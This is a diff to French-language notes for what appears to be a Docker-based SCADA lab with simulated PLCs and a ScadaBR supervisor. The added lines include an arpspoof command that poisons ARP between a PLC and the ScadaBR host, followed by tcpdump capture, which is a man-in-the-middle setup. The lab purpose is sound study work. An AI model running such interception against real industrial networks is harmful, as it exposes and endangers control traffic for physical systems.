@@ -9,3 +9,11 @@ Lancer les conteneurs : plc1 : sudo docker run --net my_network --ip 192.168.1.1
 Puis 192.168.1.12, .13, .14 pour les plc suivants
 
 Vérifier que le port 502 est bien exposé car les conteneurs n'acceptent pas les ping : nc -zv ip_plc 502
+
+Lancer le docker scadaBR : docker run --net test_network --ip 192.168.1.6 --privileged -p8080:8080 -p8081:3306 --name ScadaBR --restart always -itd carloskze/scadabr:latest
+
+Arpsoof : sudo arpspoof -i <id_interface_reseau_docker> -r -t 192.168.1.11 192.168.1.6
+
+Tcpdump : sudo tcpdump -i <id_interface_reseau_docker>
+
+
